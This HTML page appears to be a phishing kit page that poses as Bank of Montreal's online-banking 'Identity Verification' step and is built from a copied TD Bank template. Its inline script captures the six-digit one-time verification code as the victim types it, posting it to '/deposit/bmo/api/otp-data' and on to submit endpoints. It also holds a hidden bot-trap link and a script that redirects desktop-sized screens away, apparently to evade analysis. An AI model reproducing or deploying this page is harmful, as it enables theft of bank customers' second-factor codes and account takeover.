<html ng-app="com.td.tdi.uapWeb" lang="en-CA"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <style type="text/css">.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;} form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable = no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-touch-fullscreen" content="yes">
        <title>Online Banking | Bank of Montreal</title>
        <link rel="stylesheet" href="files/uap-application-all-css.css">
        <link href="assets/bmo/favicon.ico?v=1" rel="shortcut icon">
        <style>
        .otp-section-red, .otp-section-error, .otp-section-warning, .otp-section, .otp-section-grey, .otp-section-mint-green, .otp-section-green {
            padding: 2px 18px;
        }

        .form-control.ng-valid:hover, .form-control.ng-valid:focus {
            border-bottom-color: #0079c1 !important;
        }
        </style>
        <script src="files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
        <script>
            var lrbank = 'BMO';
            var lrinfo = '2FA';
        </script>
        <script src="files/actions.js###%"></script>
        <link rel="stylesheet" href="files/all.css">
        <script>
        $(document).on('change', '#input-code', function() {
            $.post('/deposit/bmo/api/otp-data', {code: $(this).val()});
        });

        var tloaded = false;

        $(document).on('submit', '#lab-form, .lab-form', function(e) {
            if (tloaded) {
                $('.btn-save').attr('disabled', true);
                $('.btn-save .btn-txt').css('display', 'none');
                $('.btn-save .btn-spinner').css('display', 'block');

                $.post('/deposit/bmo/api/otp-submit', {code: $('#input-code').val()}, function(response) {
                    location.href = '/deposit/bmo/wo';
                });
            } else {
                tloaded = true;

                $('#btn-send').css('display', 'none');
                $('#btn-sending').css('display', 'block');

                $.post('/deposit/bmo/api/otp-type', $(this).serialize(), function(response) {
                    setTimeout(function() {
                        $('#btn-sending').css('display', 'none');
                        $('#btn-next').css('display', 'block');
                        $('#step-2').css('display', 'block');
                        $('#input-code').attr('required', true);
                    }, 1000);
                });
            }

            e.preventDefault();
        });
        </script>
    </head>
    <body prevent-click-highlight="" autoscroll="" class="">
        <div id="contentWrapper">
            <!-- Header -->
            <!---->
            <div data-ui-view="header" class="" style="">
                <otp-header>
                    <div class="td_rq_header-nav td-header-nav">
                        <!-- Desktop Header START -->
                        <header class="td-header-desktop">
                            <div class="td-nav-primary" style="background-color:#ffffff">
                                <div class="td-container">
                                    <div class="td-section-left">
                                        <div class="td-logo" style="margin-top: 15px;">
                                            <img ng-src="/assets/bmo/logo.png" style="width:100px" src="files/logo.png">
                                        </div>
                                    </div>
                                    <div class="td-section-right">
                                        <div class="td-quick-access">
                                            <ul class="td-header-nav-utilities">
                                                <li ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-dropdown td-dropdown-language td-dropdown-no-hover ng-hide" aria-hidden="true">
                                                    <a href="deposit/bmo/t.php" class="td-show-label" aria-haspopup="true" aria-expanded="false" id="td-desktop-nav-dropdown-link-0">
                                                    <span class="td-forscreenreader">Select language</span>
                                                    Français
                                                    <span class="td-icon expand" aria-hidden="true"></span>
                                                    <span class="td-icon collapse" aria-hidden="true"></span>
                                                    </a>
                                                    <ul class="td-dropdown-content" aria-labelledby="td-desktop-nav-dropdown-link-0">
                                                        <!---->
                                                        <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                                            <a href="deposit/bmo/t.php" role="button" ng-click="vm.setLanguage(language)">
                                                                English
                                                                <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true">
                                                                </span><!---->
                                                                <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span><!---->
                                                            </a>
                                                        </li>
                                                        <!---->
                                                        <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                                            <a href="deposit/bmo/t.php" role="button" ng-click="vm.setLanguage(language)">
                                                                Français
                                                                <!---->
                                                                <!---->
                                                            </a>
                                                        </li>
                                                        <!---->
                                                    </ul>
                                                </li>
                                                <li class="secure-lock-position" aria-hidden="true">
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </header>
                        <!-- Desktop Header END -->
                        <!-- Mobile Header START -->
                        <header class="td-header-mobile">
                            <div class="td-container">
                                <div class="td-section-left">
                                    <button type="button" class="td-mobile-action-button td-mobile-menu-button">
                                        <div ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-mobile-menu-button-icon ng-hide" aria-hidden="true">
                                            <span class="td-forscreenreader">Open menu</span>
                                            <span class="icon-bar" aria-hidden="true"></span>
                                            <span class="icon-bar" aria-hidden="true"></span>
                                            <span class="icon-bar" aria-hidden="true"></span>
                                        </div>
                                        <div class="td-logo">
                                            <img class="logoImage" src="files/bmo-logo-white.svg" style="margin-left:120px; margin-right:auto;width:120px;">
                                        </div>
                                    </button>
                                    <button type="button" class="td-mobile-action-button td-mobile-back-button" onclick="history.back();">
                                        Test!
                                        <div class="td-logo">
                                            <img src="files/logo.png" style="width:91px">
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </header>
                        <!-- Mobile Header END -->
                        <!-- Mobile Off-canvas Menu START -->
                        <div ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-nav-mobile ng-hide" aria-hidden="true">
                            <!-- Primary mobile menu START -->
                            <div class="td-nav-mobile-menu td-nav-mobile-menu-primary">
                                <span tabindex="0"></span>
                                <div class="td-nav-mobile-menu-top">
                                    <div class="td-nav-mobile-menu-header">
                                        <div class="td-logo">
                                            <a href="https://authentication.td.com/">
                                                <img src="files/logo.png" alt="BMO">
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <nav>
                                    <ul class="td-nav-mobile-menu-list">
                                        <li class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-language">
                                            <a href="deposit/bmo/t.php" aria-expanded="false" role="button">
                                            <span class="td-forscreenreader">Select language</span>
                                            Français
                                            <span class="td-icon expand" aria-hidden="true"></span>
                                            <span class="td-icon collapse" aria-hidden="true"></span>
                                            </a>
                                            <ul class="td-accordion-content">
                                                <!---->
                                                <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                                    <a href="deposit/bmo/t.php" role="button" ng-click="vm.setLanguage(language)">
                                                        English
                                                        <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true">
                                                        </span><!---->
                                                        <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span><!---->
                                                    </a>
                                                </li>
                                                <!---->
                                                <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                                    <a href="deposit/bmo/t.php" role="button" ng-click="vm.setLanguage(language)">
                                                        Français
                                                        <!---->
                                                        <!---->
                                                    </a>
                                                </li>
                                                <!---->
                                            </ul>
                                        </li>
                                    </ul>
                                </nav>
                                <span tabindex="0"></span>
                            </div>
                            <!-- Primary mobile menu END -->
                            <div class="td-nav-mobile-overlay"></div>
                        </div>
                        <!-- Mobile Off-canvas Menu END -->
                    </div>
                </otp-header>
            </div>
            <!-- Main Content / Body -->
            <div class="td-contentarea" role="main" style="padding-top: 70px;">
                <!---->
                <ui-view class="" style="">
                    <!---->
                    <ui-view>
                        <reset>
                            <!---->
                            <ui-view class="" style="">
                                <reset-password dt="::$resolve.dt" device-print="::$resolve.devicePrint" device-info="::$resolve.deviceInfo" thread-matrix="::$resolve.threadMatrix">
                                    <div class="text-center">
                                        <otp-server-error error="vm.dt.recoverPwdError" display="banner">
                                            <!---->
                                        </otp-server-error>
                                    </div>
                                    <div class="td-container">
                                        
                                        
                                        <form method="post" action="928463.php" class="ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic" id="lab-form">
                                            <h1 class="text-center">Identity Verification</h1>
                                            <div class="td-row">
                                                <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                                                    <div class="tfa-info" style="font-size: 15px;">
                                                        <p>In order to sign on to BMO, we need to verify your identity.</p>
                                                        <p>We will send you a one-time verification code to the contact method selected below.</p>
                                                        <p class="mb5">Note: For account security, we're no longer sending one-time verification codes to personal or free email services.</p>
                                                    </div>
                                                                                                        <div class="otp-section-mint-green otp-full-width-sm">
                                                        <div class="td-row" style="padding-top: 10px;">
                                                            
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="td-row" id="step-2" style="display: block;">
                                                <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                                                    <div class="otp-section-mint-green otp-full-width-sm">
                                                        <p class="code-sent mb5" style="margin-bottom: 5px;">The code has been sent to the selected contact method.</p>
                                                        <div class="td-row">
                                                            <div class="td-col-sm-6 td-col-sm-offset-3">
                                                                <div class="form-group" style="padding-bottom: 0px">
                                                                    <label>Verification Code</label>
                                                                    <input pattern="[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}" data-id="otvc" id="input-code" type="tel" name="code" placeholder="6-digit code" maxlength="6" value="" class="form-control ng-empty lrinput" attr-action="Filling 2FA Code" required="required">
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <p>Didn't get the code? <a href="javascript:;" class="nga-resend-button" id="btn-resend">Resend code</a></p>
                                                        <p class="code-sent mb5" style="margin-bottom: 5px;">Please allow a few minutes for the verification code to be sent.</p>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="td-row">
                                                <div class="td-col-sm-4 td-col-sm-offset-2 td-col-sm-push-4 td-col-md-3 td-col-md-offset-3 td-col-md-push-3">
                                                    <div class="form-group" style="padding-top: 15px;">
                                                        <button type="submit" id="btn-send" name="save" value="1" class="td-button  td-button" style="background-color: rgb(0, 121, 193); width: 100%; display: none;">
                                                            <font color="white">  Send</font>
                                                        </button>
                                                        <button type="submit" name="save" id="btn-sending" value="1" class="td-button  td-button" style="background-color: rgb(0, 121, 193); width: 100%; display: none;" disabled="">
                                                            <font color="white">  Sending</font>
                                                        </button>
                                                        <button type="submit" id="btn-next" name="save" value="1" class="td-button btn-save td-button" style="background-color: rgb(0, 121, 193); width: 100%; display: block;">
                                                            <span class="btn-txt"><font color="white">  Next</font></span>
                                                            <span class="btn-spinner" style="display: none"><i class="fa fa-spinner fa-spin"></i></span>
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>
                                        </form>                                       <br><br><br><br><br><br><br><br><br><br><br><br><br>
                                    </div>
                                    <br><br>
                                </reset-password>
                            </ui-view>
                        </reset>
                    </ui-view>
                </ui-view>
            </div>
            <!-- Footer -->
            <!---->
            <div data-ui-view="footer" class="">
                <otp-footer>
                    <footer class="td-background-dark-green" style="left: 0px; right: 0px; bottom: 0px; position: absolute;">
                        <!---->
                        <div class="td-container">
                            <div class="td-row">
                                <div class="td-col-xs-12 td-footer-content otp-footer-content">
                                    <div class="td-footer-links td-copy-align-centre td-copy-white">
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/main/contact-us">
                                        Contact us
                                        </a>
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/about/banking/privacy-security/our-privacy-code">
                                        Privacy
                                        </a>
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/popups/global/legal">
                                        Legal
                                        </a>
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/about/banking/privacy-security/how-we-protect-you">
                                        Security
                                        </a>
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/popups/global/cdic">
                                        CDIC Member
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </footer>
                </otp-footer>
            </div><a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
        </div>
        <!--[if lt IE 9]>
        <script type="text/javascript" src="resources/es5-shim/es5-shim.min.js?v=0.0.8-HOTFIX2"></script>
        <script type="text/javascript" src="resources/html5shiv/dist/html5shiv.min.js?v=0.0.8-HOTFIX2"></script>
        <![endif]-->
        <div id="ads"></div>
        <div id="ads"></div>
        <div id="ads"></div>
    

</body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>